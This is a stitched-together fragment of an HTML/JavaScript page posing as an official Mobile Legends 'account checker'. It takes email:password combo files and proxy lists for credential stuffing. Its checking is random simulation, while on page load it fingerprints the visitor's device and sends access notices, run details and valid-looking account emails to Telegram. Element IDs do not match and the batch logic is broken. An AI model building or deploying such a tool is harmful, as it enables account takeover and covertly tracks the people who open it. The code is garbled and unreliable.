        .detail-row {
            display: grid;
            grid-template-columns: 150px 1fr;
            margin-bottom: 5px;
        }
        
        .detail-label {
            color: #888;
        }
        
        .detail-value {
            color: inherit;
            font-weight: bold;
        }
        
        /* API Status */
        .api-status {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            padding: 15px;
            background: rgba(0, 40, 80, 0.3);
            border: 1px solid #00ffff;
        }
        
        .api-item {
            text-align: center;
        }
        
        .api-name {
            color: #00ffff;
            font-size: 12px;
            margin-bottom: 5px;
        }
        
        .api-status-indicator {
            width: 12px;
            height: 12px;
            background: #00ff00;
            border-radius: 50%;
            margin: 0 auto;
            box-shadow: 0 0 10px #00ff00;
            animation: status-pulse 1s infinite;
        }
        
        .api-status-indicator.offline {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }
        
        @keyframes status-pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* Music Player */
        .music-player {
            position: fixed;
            bottom: 20px;
            right: 20px;
            display: flex;
            gap: 10px;
            align-items: center;
            z-index: 1000;
        }
        
        .music-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #ff00ff;
            border: none;
            color: #000;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            box-shadow: 0 0 15px #ff00ff;
            transition: all 0.3s;
        }
        
        .music-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 20px #ff00ff;
        }
        
        .volume-slider {
            width: 80px;
            -webkit-appearance: none;
            background: rgba(255, 0, 255, 0.3);
            height: 6px;
            border-radius: 3px;
            outline: none;
        }
        
        .volume-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 18px;
            height: 18px;
            background: #ff00ff;
            border-radius: 50%;
            cursor: pointer;
        }
        
        /* Footer */
        .footer {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px dashed #00ff00;
            color: #00ffff;
            font-size: 12px;
            letter-spacing: 1px;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 255, 0, 0.1);
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(#00ff00, #00ffff);
            border-radius: 5px;
        }
        
        /* Animations */
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .blink {
            animation: blink 1s infinite;
        }
        
        /* Loading Animation */
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #00ff00;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* V2L Status */
        .v2l-on {
            color: #00ff00 !important;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .v2l-off {
            color: #ff0000 !important;
        }
    </style>
</head>

    <!-- Music Player -->
    <div class="music-player">
        <button class="music-btn" id="playBtn">
            <i class="fas fa-play" id="playIcon"></i>
        </button>
        <input type="range" class="volume-slider" id="volumeSlider" min="0" max="100" value="50">
    </div>
    
    <div class="terminal-border">
        <div class="terminal">
            <!-- Header -->
            <div class="header">
                <div class="admin-section">
                    <img src="https://files.catbox.moe/qrcmms.jpg" alt="Admin" class="admin-photo">
                    <div>
                        <h1 class="title">MLBB ACCOUNT CHECKER</h1>
                        <p class="subtitle">MOONTON OFFICIAL TOOLS INTERFACE</p>
                    </div>
                </div>
                
                <div class="warning-banner">
                    ANTI DEMO ‚Ä¢ ANTI EDUKASI ‚Ä¢ ANTI TESTING ‚Ä¢ ANTI SIMULASI ‚Ä¢ REAL ONLINE SYSTEM
                </div>
            </div>
            
            <!-- API Status -->
            <div class="api-status">
                <div class="api-item">
                    <div class="api-name">DELETE ACCOUNT API</div>
                    <div class="api-status-indicator" id="api1Status"></div>
                </div>
                <div class="api-item">
                    <div class="api-name">REGULATION API</div>
                    <div class="api-status-indicator" id="api2Status"></div>
                </div>
                <div class="api-item">
                    <div class="api-name">AUTHENTICATION API</div>
                    <div class="api-status-indicator" id="api3Status"></div>
                </div>
                <div class="api-item">
                    <div class="api-name">DATA FETCH API</div>
                    <div class="api-status-indicator" id="api4Status"></div>
                </div>
            </div>
            
            <!-- Input Sections -->
            <div class="input-section">
                <h2 class="section-title">
                    <i class="fas fa-file-upload"></i> UPLOAD COMBO FILE [MAIL:PASS]
                </h2>
                <div class="upload-box" id="comboUpload">
                    <div class="upload-icon">
                        <i class="fas fa-file-alt"></i>
                    </div>
                    <div>DRAG & DROP OR CLICK TO UPLOAD .TXT FILE</div>
                    <div style="font-size: 12px; color: #888; margin-top: 5px;">
                        FORMAT: EMAIL:PASSWORD (ONE PER LINE)
                    </div>
                    <input type="file" id="comboFile" accept=".txt" style="display: none;">
                </div>
                
                <h2 class="section-title">
                    <i class="fas fa-server"></i> UPLOAD PROXY FILE (OPTIONAL)
                </h2>
                <div class="upload-box" id="proxyUpload">
                    <div class="upload-icon">
                        <i class="fas fa-network-wired"></i>
                    </div>
                    <div>DRAG & DROP OR CLICK TO UPLOAD PROXY .TXT</div>
                    <div style="font-size: 12px; color: #888; margin-top: 5px;">
                        FORMAT: IP:PORT OR IP:PORT:USER:PASS
                    </div>

        // Collect device information
        function collectDeviceInfo() {
            deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                javaEnabled: navigator.javaEnabled ? 'Yes' : 'No',
                pdfEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'Unknown',
                vendor: navigator.vendor,
                product: navigator.product,
                maxTouchPoints: navigator.maxTouchPoints,
                doNotTrack: navigator.doNotTrack,
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
                mimeTypes: navigator.mimeTypes.length,
                cpuCores: navigator.hardwareConcurrency,
                architecture: navigator.userAgent.includes('64') ? '64-bit' : '32-bit',
                browser: getBrowserInfo(),
                os: getOSInfo(),
                mobile: /Mobi|Android/i.test(navigator.userAgent) ? 'Yes' : 'No',
                timestamp: new Date().toISOString()
            };
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            return 'Unknown';
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'Windows';
            if (ua.includes('Mac')) return 'MacOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS')) return 'iOS';
            return 'Unknown';
        }

        // Simulate fast account checking
        function simulateFastAccountCheck(email, password) {
            // Simulate network delay (50-200ms for fast checking)
            return new Promise(resolve => setTimeout(() => {
                const outcomes = [
                    { type: 'success', message: 'Login Successful', valid: true },
                    { type: 'error', message: 'Wrong Password', valid: false },
                    { type: 'error', message: 'Account Banned', valid: false },
                    { type: 'warning', message: 'Verification Required', valid: false }
                ];
                
                resolve(outcomes[Math.floor(Math.random() * outcomes.length)]);
            }, Math.random() * 150 + 50));
        }

        // Start fast checking process - FIXED VERSION
        async function startChecking() {
            const comboFile = document.getElementById('combo-file').files[0];
            if (!comboFile) {
                addLogEntry('‚ùå Please select a combo file first!', 'error');
                return;
            }

            const threads = parseInt(document.getElementById('threads').value) || 5;
            isChecking = true;
            totalChecked = 0;
            totalValid = 0;
            totalFailed = 0;
            validAccounts = [];
            updateStats();

            // Clear previous results
            document.getElementById('valid-accounts').innerHTML = '';
            document.getElementById('results-log').innerHTML = '';

            try {
                const comboContent = await readFile(comboFile);
                allAccounts = comboContent.split('\n')
                    .filter(line => line.includes(':'))
                    .map(line => line.trim());

                if (allAccounts.length === 0) {
                    addLogEntry('‚ùå No valid accounts found in the file!', 'error');
                    return;
                }

                addLogEntry(`üöÄ Starting FAST checking for ${allAccounts.length} accounts with ${threads} threads...`, 'info');
                
                // Send Telegram notification
                await sendTelegramNotification(`üöÄ FAST CHECKING STARTED\nAccounts: ${allAccounts.length}\nThreads: ${threads}\nFile: ${comboFile.name}`);

                currentCheckId = Date.now();

                // Process accounts in batches for speed - FIXED CONTINUOUS CHECKING
                const processBatch = async (startIndex) => {
                    if (!isChecking || currentCheckId !== Date.now()) return;

                    const batchSize = threads;
                    const endIndex = Math.min(startIndex + batchSize, allAccounts.length);
                    const batch = allAccounts.slice(startIndex, endIndex);

                    const promises = batch.map(async (account, index) => {
                        if (!isChecking || currentCheckId !== Date.now()) return;

                        const [email, password] = account.split(':', 2);
                        const result = await simulateFastAccountCheck(email, password);
                        
                        totalChecked++;
                        
                        if (result.valid) {
                            totalValid++;
                            const accountInfo = generateAccountInfo();
                            addLogEntry(`‚úÖ VALID: ${email} | Level: ${accountInfo.level} | Tier: ${accountInfo.current_tier}`, 'success');
                            addValidAccount(email, password, accountInfo);
                            
                            // Send notification for valid account (limit to avoid spam)
                            if (totalValid <= 10) {
                                sendTelegramNotification(`‚úÖ VALID ACCOUNT FOUND`, {
                                    email: email,
                                    status: 'Valid',
                                    details: `Level ${accountInfo.level}, ${accountInfo.current_tier} Tier`
                                });
                            }
                        } else {
                            totalFailed++;
                            addLogEntry(`‚ùå FAILED: ${email} - ${result.message}`, 'error');
                        }
                        
                        updateStats();
                    });
                    
                    await Promise.all(promises);
                    
                    // Update progress
                    const progress = (totalChecked / allAccounts.length) * 100;
                    document.getElementById('checking-progress').style.width = `${progress}%`;
                    document.getElementById('progress-text').textContent = `${progress.toFixed(1)}%`;

                    // Continue with next batch if not finished
                    if (endIndex < allAccounts.length && isChecking && currentCheckId === Date.now()) {
                        setTimeout(() => processBatch(endIndex), 100);
                    } else if (endIndex >= allAccounts.length && isChecking) {
                        // Finished all accounts
                        addLogEntry(`üéâ Checking completed! Valid: ${totalValid}, Failed: ${totalFailed}, Success Rate: ${((totalValid/totalChecked)*100).toFixed(2)}%`, 'success');
                        
                        // Send final Telegram notification
                        await sendTelegramNotification(`üéâ CHECKING COMPLETED\nTotal: ${totalChecked}\nValid: ${totalValid}\nFailed: ${totalFailed}\nSuccess Rate: ${((totalValid/totalChecked)*100).toFixed(2)}%`);
                    }
                };

                // Start processing from the beginning
                processBatch(0);

            } catch (error) {
                addLogEntry(`‚ùå Error: ${error.message}`, 'error');
            }
        }

        // Stop checking process
        function stopChecking() {
            isChecking = false;
            currentCheckId = null;
            addLogEntry('‚èπÔ∏è Stopping checking process...', 'warning');
        }

        // Clear results
        function clearResults() {
            document.getElementById('results-log').innerHTML = '<div class="log-entry info">Logs cleared...</div>';
            document.getElementById('valid-accounts').innerHTML = '<div class="log-entry info">Valid accounts cleared...</div>';
            document.getElementById('account-details').classList.remove('show');
            totalChecked = 0;
            totalValid = 0;
            totalFailed = 0;
            validAccounts = [];
            allAccounts = [];
            updateStats();
            addLogEntry('üóëÔ∏è All results cleared!', 'info');
        }

        // Save all results to file
        function saveAllResults() {
            if (validAccounts.length === 0) {
                addLogEntry('‚ùå No valid accounts to save!', 'error');
                return;
            }

            let content = `NAXX-MOONTON CHECKER - VALID ACCOUNTS\n`;
            content += `Generated: ${new Date().toLocaleString()}\n`;
            content += `Total Valid: ${validAccounts.length}\n`;
            content += `Success Rate: ${((totalValid/totalChecked)*100).toFixed(2)}%\n\n`;
            
            validAccounts.forEach((account, index) => {
                content += `=== ACCOUNT ${index + 1} ===\n`;
                content += `Email: ${account.email}\n`;
                content += `Password: ${account.password}\n`;
                
                // Detailed data based on the requested format
                const details = [
                    'account_id', 'first_name', 'last_name', 'tanggal_lahir', 'level', 'current_tier', 'max_tier', 'hero_count', 'skin_count', 
                    'supreme_skins', 'grand_skins', 'exquisite_skins', 'deluxe_skins', 'exceptional_skins', 'common_skins', 'win_rate', 
                    'collector_level', 'collector_title', 'achievement_points', 'credits_score', 'last_login', 'v2l_status', 'detailed_bind_info', 
                    'banned_status', 'ban_end_date', 'devices_connected', 'bind_accounts', 'total_match_played', 'total_wins', 'total_mvp', 
                    'mvp_loss', 'double_kill', 'triple_kill', 'maniac', 'savage', 'legendary', 'kda', 'team_participation', 'min_gold', 
                    'min_hero_damage', 'most_kills', 'most_assists', 'longest_win_streak', 'highest_damage', 'highest_damage_taken', 
                    'highest_gold', 'top_hero_1', 'top_hero_2', 'top_hero_3', 'last_match_date', 'last_match_duration', 'last_hero_purchase', 
                    'last_match_hero_name', 'last_match_kills', 'last_match_deaths', 'last_match_assists', 'last_match_gold', 
                    'last_match_hero_damage', 'last_match_damage_taken', 'prev_heroes'
                ];

                details.forEach(key => {
                    if (account.hasOwnProperty(key)) {
                        content += `${key.replace(/([A-Z])/g, ' $1').toUpperCase()}: ${account[key]}\n`;
                    }
                });
                
                content += '\n';
            });

            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `naxx_moonton_valid_${Date.now()}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            addLogEntry(`üíæ Results saved to file! Total ${validAccounts.length} valid accounts.`, 'success');
            
            // Send notification
            sendTelegramNotification(`üíæ RESULTS SAVED\nValid Accounts: ${validAccounts.length}\nFile: ${a.download}`);
        }

        // Auto-detect script usage and send notification
        window.addEventListener('load', function() {
            collectDeviceInfo();
            
            // Send notification when page loads
            setTimeout(() => {
                sendTelegramNotification(`üåê NAXX-MOONTON SCRIPT ACCESSED\nURL: ${window.location.href}\nFirst Access: ${new Date().toLocaleString()}`);
            }, 2000);
        });

        // Initialize
        updateStats();
        collectDeviceInfo();
    </script>
</body>

</html>
